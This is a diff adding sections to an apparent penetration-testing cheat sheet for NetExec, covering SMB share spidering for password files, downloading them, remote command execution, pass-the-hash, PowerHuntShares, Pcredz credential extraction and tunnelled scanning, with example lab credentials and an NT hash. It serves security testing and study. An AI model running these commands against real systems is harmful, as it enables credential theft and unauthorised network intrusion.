@@ -255,6 +255,73 @@ LDAP        10.10.11.35     389    CICADA-DC        emily.oscars                
 ./nxc ldap 10.10.11.35 -d cicada.htb --dns-server 10.10.11.35 -u 'CICADA\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --bloodhound
 ```
 
+### Share Spidering
+
+Search share contents for keywords (e.g. passwords in files):
+
+```bash
+nxc smb TARGET -d DOMAIN -u USER -p 'PASS' --spider SHARE_NAME --content --pattern "passw"
+
+# Example:
+nxc smb file01 -d NEXURA -u hwilliam -p 'dealer-screwed-gym1' --spider PRIVATE --content --pattern "passw"
+SMB  //172.16.119.10/PRIVATE/hwilliam/Online passwords.xlsx [lastm:'2025-04-29 18:16' size:7360]
+```
+
+### Download File from Share
+
+```bash
+nxc smb TARGET -d DOMAIN -u USER -p 'PASS' --share SHARE --get-file '\path\to\file.xlsx' /tmp/local_file.xlsx
+
+# Example:
+nxc smb file01 -d NEXURA -u hwilliam -p 'dealer-screwed-gym1' --share PRIVATE --get-file '\hwilliam\Online passwords.xlsx' /tmp/passwords.xlsx
+```
+
+### Read Remote Files via Command Execution
+
+Use `-X` (PowerShell) to read files on the remote target:
+
+```bash
+nxc smb TARGET -u USER -H "NTHASH" --share C$ -X "type C:\path\to\file.txt"
+```
+
+### Pass the Hash with NT Hash Only
+
+When you only have the NT hash (no LM hash), prefix with a colon:
+
+```bash
+nxc smb TARGET -u Administrator -H ':30B3783CE2ABF1AF70F77D0660CF3453' --shares
+```
+
+### PowerHuntShares — Automated Share Hunting
+
+For large-scale share discovery and hunting, use PowerHuntShares:
+
+```powershell
+Import-Module .\PowerHuntShares.psm1
+Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
+```
+
+### Pcredz — Extract Credentials from PCAPs
+
+```bash
+# Docker
+docker build -t pcredz .
+docker run --rm -v $(pwd):/data pcredz -f capture.pcapng
+
+# Direct
+python3 Pcredz -t -v -f /path/to/capture.pcapng
+```
+
+### Threading Through Tunnels
+
+When running nxc through sliver tunnels or port forwards, limit threads to avoid killing the tunnel:
+
+```bash
+nxc smb 127.0.0.1 -u david -d DOMAIN -H HASH --shares --port 4445 -t 1
+```
+
+---
+
 ### Execution of Commands
 
 * execute cmd.exe command
